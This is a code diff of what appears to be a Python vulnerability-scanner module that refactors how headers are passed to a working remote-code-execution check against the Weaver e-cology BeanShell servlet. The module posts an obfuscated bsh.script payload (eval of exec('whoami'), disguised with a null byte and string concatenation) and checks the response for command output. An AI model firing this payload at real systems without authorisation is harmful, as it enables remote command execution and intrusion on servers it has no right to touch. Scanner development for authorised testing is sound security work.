@@ -33,7 +33,7 @@ def UrlProcessing(url):
 
 payload= '/weaver/bsh.servlet.BshServlet'
 post_data = 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -46,15 +46,14 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
 
     try:
         payload_url = scheme+"://"+url+ ':' + str(port)+payload
-        headers = {
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            "Referer": payload_url,
-            "Cookie": "JSESSIONID=abcT_7z-8zGPy7QoU_n1w; testBanCookie=test",
-            "Content-Type": "application/x-www-form-urlencoded",
-            'User-Agent': RandomAgent,
-        }
-        resp = requests.post(payload_url, data=post_data,headers=headers, proxies=proxies,timeout=10, verify=False)
+
+        Headers ['Accept']='*/*'
+        Headers ["Referer"]= payload_url
+        Headers ["Cookie"]="JSESSIONID=abcT_7z-8zGPy7QoU_n1w; testBanCookie=test"
+        Headers ["Content-Type"]="application/x-www-form-urlencoded"
+
+
+        resp = requests.post(payload_url, data=post_data,headers=Headers, proxies=proxies,timeout=10, verify=False)
         con = resp.content
         code = resp.status_code
         if code==200 and (con.lower().find('system:')!=-1 or con.lower().find('root:')!=-1):
